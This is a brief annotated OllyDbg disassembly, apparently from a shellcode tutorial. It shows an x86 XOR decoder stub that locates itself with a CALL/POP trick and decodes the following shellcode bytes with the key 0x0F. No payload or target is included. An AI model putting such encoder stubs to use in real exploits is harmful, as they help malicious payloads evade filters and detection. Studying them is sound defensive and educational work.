...
00401002     E8 FFFFFF      CALL OLLYDBG.00401006                    ; Push EIP
00401006     FFC1           INC ECX                                  ; Increase ECX
00401008     66:B9 FF00     MOV CX,0FF                               ; Mov length of shellcode into CX
0040100C     58             POP EAX                                  ; Get EIP
0040100D     03C8           ADD ECX,EAX                              ; Add EIP to ECX
0040100F     8070 11 0F     XOR BYTE PTR DS:[EAX+11],0F              ; XOR byte at EAX+11 with seed
00401013     40             INC EAX                                  ; Increase counter
00401014     3BC1           CMP EAX,ECX                              ; Compare counter to length of shellcode
00401016    ^75 F7          JNZ SHORT OLLYDBG.0040100F               ; If not, return to XOR
